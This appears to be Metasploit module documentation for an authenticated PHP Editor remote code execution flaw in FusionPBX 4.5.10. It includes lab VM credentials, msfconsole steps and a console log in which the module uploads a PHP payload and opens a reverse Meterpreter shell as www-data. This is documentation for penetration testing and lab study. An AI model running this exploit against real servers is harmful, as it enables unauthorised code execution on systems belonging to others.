## Vulnerable Application
FusionPBX 4.5.10 is vulnerable to authenticated remote code execution through their PHP Editor function. Users can rewrite any PHP on site to gain access as www-data.

### Creating A Testing Environment
The vendor has patched this issue. I have kept a copy of the version for demo purposes:
https://mega.nz/#!yiRigCAI!9Qt2g3wrQy3oLHAjf8uN2sz6dWkuhd4QV-G8G1FGv4k

Download the OVF from the link provided and import OVF.

```
Username: root
Password: fusion

Database Password: bckfRgOxcFitVIsPRKVlmuvjfU

1. login as root on machine
2. cd /etc/fusionpbx
3. mv config.php config1.php
4. on web browser, visit https://ip/
5. set new admin password on the web ui prompt
6. on the next page insert database password into the database configuration 
7. submit and exploit
```

## Verification
1. start msfconsole
2. use exploit/linux/http/fusionpbx_php_editor_cmd_exec
3. set RHOST target_ip
4. set RPORT 443
5. set SSL true
6. set USERNAME login_username
7. set PASSWORD login_password
8. exploit

## Scenarios
### FusionPBX 4.5.10
```
msf5 > use exploit/linux/http/fusionpbx_php_editor_cmd_exec
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > set RHOST 192.168.0.48
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > set RPORT 443
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > set SSL true
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > set USERNAME admin
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > set PASSWORD fusion
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > exploit
msf5 exploit(linux/http/fusionpbx_php_editor_cmd_exec) > run
[*] Started reverse TCP handler on 192.168.0.12:4444 
[+] Login Successful!
[*] 192.168.0.48:443 - Sending PHP payload (/var/www/fusionpbx/project_root.php)
[+] Uploaded Successfully!
[*] 192.168.0.48:443 - Executing project_root.php...
[*] Sending stage (38288 bytes) to 192.168.0.48
[*] Meterpreter session 2 opened (192.168.0.12:4444 -> 192.168.0.48:51374) at 2020-01-20 07:22:05 +0000
meterpreter > getuid
Server username: www-data (33)
meterpreter > 
```

